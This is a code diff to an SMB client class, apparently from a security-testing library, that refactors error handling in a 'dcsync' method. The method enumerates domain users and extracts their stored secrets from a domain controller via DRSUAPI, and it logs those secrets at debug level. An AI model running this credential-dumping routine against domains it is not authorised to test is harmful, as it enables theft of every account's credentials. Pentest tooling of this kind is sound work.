@@ -346,46 +346,55 @@ class SMBMachine:
 		async for username, user_sid, err in self.samr.list_domain_users(domain_handle):
 			yield username, user_sid, err
 
-	#@red_gen
 	@req_samr_gen
 	async def dcsync(self, target_domain = None, target_users = []):
-		if target_domain is None:
-			logger.debug('No domain defined, fetching it from SAMR')
-					
-							
-			logger.debug('Fetching domains...')
-			async for domain, _ in rr_gen(self.samr.list_domains()):
-				if domain == 'Builtin':
-					continue
-				if target_domain is None: #using th first available
-					target_domain = domain
-					logger.debug('Domain available: %s' % domain)
-		
-		async with SMBDRSUAPI(self.connection, target_domain) as drsuapi:
-			try:
-				await rr(drsuapi.connect())
-				await rr(drsuapi.open())
-			except Exception as e:
-				logger.exception('Failed to connect to DRSUAPI!')
-				raise e
-
-			logger.debug('Using domain: %s' % target_domain)
-			if len(target_users) > 0:
-				for username in target_users:
-					secrets, _ = await drsuapi.get_user_secrets(username)
-					yield secrets
-							
-			else:
+		try:
+			if target_domain is None:
+				logger.debug('No domain defined, fetching it from SAMR')
 				
-				domain_sid, _ = await self.samr.get_domain_sid(target_domain)
-				domain_handle, _ = await self.samr.open_domain(domain_sid)
-				async for username, user_sid, err in self.samr.list_domain_users(domain_handle):
+				logger.debug('Fetching domains...')
+				async for domain, err in self.samr.list_domains():
 					if err is not None:
-						yield None, err
-					logger.debug('username: %s' % username)
-					secrets, _ = await rr(drsuapi.get_user_secrets(username))
-					logger.debug('secrets: %s' % secrets)
-					yield secrets, None
+						raise err
+					if domain == 'Builtin':
+						continue
+					if target_domain is None: #using th first available
+						target_domain = domain
+						logger.debug('Domain available: %s' % domain)
+			
+			async with SMBDRSUAPI(self.connection, target_domain) as drsuapi:
+				try:
+					await rr(drsuapi.connect())
+					await rr(drsuapi.open())
+				except Exception as e:
+					logger.exception('Failed to connect to DRSUAPI!')
+					raise e
+
+				logger.debug('Using domain: %s' % target_domain)
+				if len(target_users) > 0:
+					for username in target_users:
+						secrets, err = await drsuapi.get_user_secrets(username)
+						yield secrets, None
+								
+				else:
+					
+					domain_sid, _ = await self.samr.get_domain_sid(target_domain)
+					domain_handle, _ = await self.samr.open_domain(domain_sid)
+					async for username, user_sid, err in self.samr.list_domain_users(domain_handle):
+						if err is not None:
+							yield None, err
+							return
+						logger.debug('username: %s' % username)
+						secrets, err = await drsuapi.get_user_secrets(username)
+						if err is not None:
+							yield None, err
+							return
+						logger.debug('secrets: %s' % secrets)
+						yield secrets, None
+
+		except Exception as e:
+			yield None, e
+			return
 
 	
 	@req_rrp
